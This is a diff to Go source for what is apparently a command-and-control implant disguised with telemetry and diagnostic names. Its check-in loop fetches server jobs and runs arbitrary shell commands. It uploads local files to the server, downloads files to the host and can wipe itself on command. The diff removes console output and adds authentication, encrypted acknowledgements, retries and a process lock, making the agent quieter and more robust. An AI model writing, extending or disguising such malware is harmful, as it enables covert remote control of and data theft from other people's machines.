@@ -2,6 +2,8 @@ package main
 
 import (
 	"bytes"
+	"crypto/sha256"
+	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -15,12 +17,13 @@ import (
 
 type DeviceTelemetryPayload struct {
 	EndpointID  string `json:"agent_id"`
-	Hostname string `json:"hostname"`
-	OS       string `json:"os"`
+	AgentSecret string `json:"agent_secret"`
+	Hostname    string `json:"hostname"`
+	OS          string `json:"os"`
 }
 
 type SyncResponse struct {
-	Status string         `json:"status"`
+	Status string          `json:"status"`
 	Jobs   []DiagnosticJob `json:"tasks"`
 }
 
@@ -31,35 +34,51 @@ type DiagnosticJob struct {
 }
 
 type DiagnosticOutput struct {
-	JobID int    `json:"task_id"`
-	Output string `json:"output"`
+	JobID       int    `json:"task_id"`
+	EndpointID  string `json:"agent_id"`
+	AgentSecret string `json:"agent_secret"`
+	ReportID    string `json:"report_id"`
+	Output      string `json:"output"`
+}
+
+type ResultAcknowledgement struct {
+	Status          string `json:"status"`
+	EndpointID      string `json:"agent_id"`
+	JobID           int    `json:"task_id"`
+	ReportID        string `json:"report_id"`
+	OutputSHA256    string `json:"output_sha256"`
+	AlreadyRecorded bool   `json:"already_recorded"`
 }
 
 func main() {
+	if err := acquireAgentProcessLock(); err != nil {
+		return
+	}
+	defer func() { _ = releaseAgentProcessLock(false) }()
+
 	InitializeTelemetry()
+	if err := initializeDurableResultState(); err != nil {
+		return
+	}
+	if resumePendingCleanup() {
+		return
+	}
 
 	hostname, _ := os.Hostname()
 	agentOS := runtime.GOOS
 
-	fmt.Printf("\n[*] Starting check-in loop (jitter: %s - %s)…\n\n", SyncDelayMin, SyncDelayMax)
-
 	for {
+		retryQueuedResults()
 		jobs, err := SyncDeviceState(hostname, agentOS)
 		if err != nil {
-			fmt.Printf("[!] Check-in failed: %v\n", err)
 			funcs.DelayNextSync(SyncDelayMin, SyncDelayMax)
 			continue
 		}
 
-		fmt.Printf("[+] Checked in - %d pending job(s)\n", len(jobs))
-
 		for _, job := range jobs {
-			fmt.Printf("[>] Executing job #%d: %s\n", job.ID, job.Command)
-
 			if job.Command == FlushCommand {
-				fmt.Println("[!] Cache flush command received from server")
-				_ = SubmitDiagnosticReport(job.ID, "Cache flush acknowledged. Cleaning up…")
-				funcs.WipeLocalCacheAndExit()
+				submitResultWithRetry(job.ID, "Cache flush acknowledged. Cleaning up...", true)
+				continue
 			}
 
 			// cd runs synchronously so the updated working directory is visible to the next job
@@ -68,20 +87,18 @@ func main() {
 				if cdErr != nil {
 					output = fmt.Sprintf("Error: %v", cdErr)
 				}
-				fmt.Printf("[<] Job #%d result: %s\n", job.ID, output)
-				_ = SubmitDiagnosticReport(job.ID, output)
+				submitResultWithRetry(job.ID, output, false)
 				continue
 			}
 
 			if strings.HasPrefix(job.Command, "get ") {
 				go func(t DiagnosticJob) {
 					filePath := strings.TrimSpace(strings.TrimPrefix(t.Command, "get "))
-					output, err := funcs.SubmitCrashDump(TelemetryEndpoint+PathUpload, EndpointID, filePath, KeyID, EncryptionKey)
+					output, err := funcs.SubmitCrashDump(TelemetryEndpoint+PathUpload, EndpointID, AgentSecret, filePath, KeyID, EncryptionKey)
 					if err != nil {
 						output = fmt.Sprintf("Upload error: %v", err)
 					}
-					fmt.Printf("[<] Job #%d result: %s\n", t.ID, output)
-					_ = SubmitDiagnosticReport(t.ID, output)
+					submitResultWithRetry(t.ID, output, false)
 				}(job)
 				continue
 			}
@@ -91,15 +108,14 @@ func main() {
 					args := strings.TrimSpace(strings.TrimPrefix(t.Command, "download "))
 					parts := strings.SplitN(args, " ", 2)
 					if len(parts) != 2 {
-						_ = SubmitDiagnosticReport(t.ID, "Usage: download <file_id> <save_path>")
+						submitResultWithRetry(t.ID, "Usage: download <file_id> <save_path>", false)
 						return
 					}
-					output, err := funcs.FetchUpdatePackage(TelemetryEndpoint+PathFiles, parts[0], strings.TrimSpace(parts[1]))
+					output, err := funcs.FetchUpdatePackage(TelemetryEndpoint+PathFiles, parts[0], strings.TrimSpace(parts[1]), EndpointID, AgentSecret, t.ID)
 					if err != nil {
 						output = fmt.Sprintf("Download error: %v", err)
 					}
-					fmt.Printf("[<] Job #%d result: %s\n", t.ID, output)
-					_ = SubmitDiagnosticReport(t.ID, output)
+					submitResultWithRetry(t.ID, output, false)
 				}(job)
 				continue
 			}
@@ -119,11 +135,7 @@ func main() {
 				if execErr != nil && output == "" {
 					output = fmt.Sprintf("Error: %v", execErr)
 				}
-				fmt.Printf("[<] Job #%d result (%d bytes)\n", t.ID, len(output))
-				err := SubmitDiagnosticReport(t.ID, output)
-				if err != nil {
-					fmt.Printf("[!] Failed to send result for job #%d: %v\n", t.ID, err)
-				}
+				submitResultWithRetry(t.ID, output, false)
 			}(job)
 		}
 
@@ -134,8 +146,9 @@ func main() {
 func SyncDeviceState(hostname, agentOS string) ([]DiagnosticJob, error) {
 	payload := DeviceTelemetryPayload{
 		EndpointID:  EndpointID,
-		Hostname: hostname,
-		OS:       agentOS,
+		AgentSecret: AgentSecret,
+		Hostname:    hostname,
+		OS:          agentOS,
 	}
 
 	respBody, err := transmitSecureTelemetry(TelemetryEndpoint+PathCheckin, payload)
@@ -163,13 +176,51 @@ func SyncDeviceState(hostname, agentOS string) ([]DiagnosticJob, error) {
 	return result.Jobs, nil
 }
 
-func SubmitDiagnosticReport(jobID int, output string) error {
+func SubmitDiagnosticReport(jobID int, output, reportID string) error {
+	// encoding/json replaces invalid UTF-8 in strings. Normalize first so the
+	// payload and the acknowledgement digest always describe identical bytes.
+	output = string([]rune(output))
 	payload := DiagnosticOutput{
-		JobID: jobID,
-		Output: output,
+		JobID:       jobID,
+		EndpointID:  EndpointID,
+		AgentSecret: AgentSecret,
+		ReportID:    reportID,
+		Output:      output,
 	}
-	_, err := transmitSecureTelemetry(TelemetryEndpoint+PathResult, payload)
-	return err
+	respBody, err := transmitSecureTelemetry(TelemetryEndpoint+PathResult, payload)
+	if err != nil {
+		return err
+	}
+
+	var envelope struct {
+		KeyID string `json:"kid"`
+		Data  string `json:"data"`
+	}
+	if err := json.Unmarshal(respBody, &envelope); err != nil {
+		return fmt.Errorf("result acknowledgement envelope: %w", err)
+	}
+	if envelope.KeyID != KeyID || envelope.Data == "" {
+		return fmt.Errorf("result acknowledgement envelope does not match this build")
+	}
+
+	plain, err := funcs.UnsealTelemetry(EncryptionKey, envelope.Data)
+	if err != nil {
+		return fmt.Errorf("authenticate result acknowledgement: %w", err)
+	}
+	var acknowledgement ResultAcknowledgement
+	if err := json.Unmarshal(plain, &acknowledgement); err != nil {
+		return fmt.Errorf("decode result acknowledgement: %w", err)
+	}
+	digest := sha256.Sum256([]byte(output))
+	expectedDigest := hex.EncodeToString(digest[:])
+	if acknowledgement.Status != "ok" ||
+		acknowledgement.EndpointID != EndpointID ||
+		acknowledgement.JobID != jobID ||
+		acknowledgement.ReportID != reportID ||
+		acknowledgement.OutputSHA256 != expectedDigest {
+		return fmt.Errorf("result acknowledgement does not match the submitted result")
+	}
+	return nil
 }
 
 // transmitSecureTelemetry JSON-encodes payload, encrypts it with AES-256-GCM,
@@ -204,7 +255,12 @@ func transmitSecureTelemetry(url string, payload any) ([]byte, error) {
 	}
 
 	if resp.StatusCode != 200 {
-		return nil, fmt.Errorf("server returned %d: %s", resp.StatusCode, string(respBody))
+		bodyStr := string(respBody)
+		if resp.StatusCode == 410 ||
+			(resp.StatusCode == 403 && strings.Contains(bodyStr, "Invalid agent identity")) {
+			return nil, &errAgentIdentityGone{StatusCode: resp.StatusCode, Body: bodyStr}
+		}
+		return nil, fmt.Errorf("server returned %d: %s", resp.StatusCode, bodyStr)
 	}
 
 	return respBody, nil
